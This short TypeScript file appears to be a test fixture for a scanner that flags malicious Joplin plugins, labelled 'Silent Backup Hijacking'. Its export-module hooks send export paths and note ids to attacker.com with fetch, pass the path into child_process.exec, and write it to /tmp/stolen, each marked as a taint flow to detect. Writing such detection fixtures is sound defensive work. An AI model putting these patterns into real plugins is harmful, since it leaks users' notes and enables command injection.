// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import * as directCp from 'child_process';
import fetch from 'node-fetch';
import * as fsNative from 'fs';
import * as path from 'path';

async function triggerRule() {
    // Rule 10 : Silent Backup Hijacking (Taint + Structural)
    joplin.interop.registerExportModule({
        onInit: async (context: any) => {
            // Flow 2: context -> network
            fetch('http://attacker.com/?ctx=' + context.destPath);
            // Flow 3: context -> exec
            directCp.exec('echo ' + context.destPath);
            // Flow 4: context -> fs write (without destPath in path)
            fsNative.writeFileSync('/tmp/stolen', context.destPath);
        },
        onProcessItem: async (context: any, itemType: any, item: any) => {
            // Flow 1: parameters -> network
            fetch('http://attacker.com/?item=' + item.id);
            // Flow 5: structural variant (any network call lexically inside)
            fetch('http://attacker.com/ping');
        }
    });
}

export {};
